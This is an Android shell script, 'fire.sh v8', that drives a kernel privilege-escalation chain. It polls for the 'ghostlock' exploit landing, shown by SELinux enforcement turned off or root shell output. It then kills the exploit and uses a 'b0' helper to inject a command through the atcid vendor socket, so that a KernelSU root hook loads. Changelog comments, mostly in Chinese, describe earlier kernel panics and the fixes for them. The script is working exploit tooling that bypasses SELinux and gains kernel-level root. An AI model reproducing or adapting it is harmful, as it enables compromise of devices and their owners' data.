#!/system/bin/sh
# fire.sh v8 - stop the exploit as soon as landing is observed; fire ksud chain
#
# v8: LANDed 后先持久化单发标记并停止 ghostlock，再调用可能卡住的 b0。
#     旧顺序把 .fired 写在 b0 之后；b0 卡住时 exploit 会继续跑 W2/W3，
#     app/host 也看不到 landed 标记，可能重复攻击已污染的内核。
#     timeout 显式用 KILL，避免 Android toybox 默认只发 TERM。
#
# v7 (2026-11-03, 06:59 硬重启事故修复 —— 同 boot 二次开火打崩内核):
#   LANDED 后 .fired 记 boot_id（旧版只写 "FIRED"，无 boot 作用域，形同虚设）。
#   watcher 启动时若 .fired 与当前 boot_id 一致 → 本 boot 已有一发成功落地，
#   堆已被污染、KSU 已在内核里 —— 立即退出，绝不二次开火。
#   （06:59 事故链：06:57:41 第一发 LANDED+KSU 上线 → 06:58:37 第二发未被
#   alive-dedup 拦截（第一发已退出）→ polluted heap 二次写 → RCU stall →
#   panic_on_rcu_stall=1 → PS_HOLD 硬复位。）
#   ksu_wait 循环加 `su -c id` 早退判据 —— 该 KSU 移植为运行时 hook，
#   /proc/modules 里不出现，旧判据必等满 20s。
#
# v6 (2026-11-02, 13:2x 连续复位事故修复):
#   1) b0 调用加 10s 硬超时 —— 13:23 事故中 b0 卡死在 vendor socket，
#      chain_fired / exploit_killed 两步都没执行，ghostlock 的 W2/W3 修复段
#      在已落地、KSU 已加载的内核上继续跑（fire.sh v6 注释明示的 wedge 场景）。
#      现在无论 b0 是否返回，后续收尾步骤必然执行。
#   2) 去重竞态修复 —— 旧版 .fire.pid 只记 pid：跨 boot 残留 pid 可能命中
#      PID 复用（误判存活），且同秒两次 arm 会都读不到对方 pid（双实例，
#      13:23:25 实测 pid=16828/16840 两条 LANDED）。现在 pidfile 记
#      "pid boot_id"，同 boot 且 /proc/<pid>/cmdline 含 fire.sh 才算存活。
# writes pidfile so ensure_fire can verify the process command line
LOG=/data/local/tmp/.fire.log
exec >>$LOG 2>&1

PIDFILE=/data/local/tmp/.fire.pid
BOOTID=$(cat /proc/sys/kernel/random/boot_id 2>/dev/null)
# v7: 同 boot 已 LANDED 门禁 —— 比 alive-dedup 更强的闸（watcher 已退出时
# alive-dedup 失效，06:58:37 二次开火正是这种时序）
OLDFIRED=$(cat /data/local/tmp/.fired 2>/dev/null)
if [ -n "$BOOTID" ] && [ "$OLDFIRED" = "$BOOTID" ]; then
  echo "=== fire v8 $(date +%T) pid=$$ fired_already: .fired matches this boot — LANDED earlier, refusing re-fire ==="
  exit 0
fi
OLD=$(cat $PIDFILE 2>/dev/null)
OLDPID=${OLD%% *}
OLDBOOT=${OLD#* }
if [ -n "$OLDPID" ] && [ "$OLDBOOT" = "$BOOTID" ] \
   && [ -d "/proc/$OLDPID" ] \
   && grep -q "fire.sh" "/proc/$OLDPID/cmdline" 2>/dev/null; then
  echo "=== fire v8 $(date +%T) pid=$$ dedup: watcher pid=$OLDPID alive (same boot) — exit ==="
  exit 0
fi
echo "$$ $BOOTID" > $PIDFILE
echo "=== fire v8 $(date +%T) pid=$$ ==="
i=0
while [ $i -lt 33000 ]; do
  e=$(cat /sys/fs/selinux/enforce 2>/dev/null)
  h=$(tr -d '\000' < /data/local/tmp/.l0 2>/dev/null | tail -c 3000 | grep -ac "uid=0(root)")
  if [ "$e" = "0" ] || [ "${h:-0}" -gt 0 ]; then
    echo "LANDED e=$e u0=$h t=$i $(date +%T)"
    # Landing dirties the kernel even if the KSU handoff below fails.
    echo "$BOOTID" > /data/local/tmp/.fired
    pkill -9 -f "/data/local/tmp/ghostlock" 2>/dev/null
    pkill -9 -x ghostlock 2>/dev/null
    echo "exploit_killed_before_chain $(date +%T)"
    sleep 0.4
    cd /data/local/tmp
    # KILL is required: Android toybox timeout otherwise defaults to TERM.
    timeout -s KILL 10 ./b0 atcid_vendor_socket "sh /data/local/tmp/one.sh #seedkeeper_client"
    echo "chain_fired rc=$? $(date +%T)"
    for p in $(pgrep -f "id; getenforce; sleep 300" 2>/dev/null); do kill -9 $p 2>/dev/null; done
    echo "supervisors_killed $(date +%T)"
    # v6: wait for the KSU module, then kill the exploit -- its remaining
    # stages (W2/W3 repairs) can wedge the kernel even after root is in.
    # v7: 该 KSU 移植是运行时 hook，/proc/modules 不可见 —— 加 su -c id
    # 早退判据，root 活了就立刻进入收尾，不再空等 20s。
    n=0
    while [ $n -lt 40 ]; do
      if grep -q kernelsu /proc/modules 2>/dev/null; then break; fi
      if [ $((n % 4)) -eq 3 ] && su -c id 2>/dev/null | grep -q "uid=0"; then break; fi
      sleep 0.5; n=$((n+1))
    done
    # v6: 无论 KSU 是否出现都杀 exploit —— 落地后 W2/W3 是已知 wedge 源
    pkill -9 -f "/data/local/tmp/ghostlock" 2>/dev/null
    pkill -9 -x ghostlock 2>/dev/null
    echo "exploit_killed ksu_wait=${n} $(date +%T)"
    exit 0
  fi
  i=$((i+1))
  sleep 0.1
done
echo "watch_timeout v8 $(date +%T)"
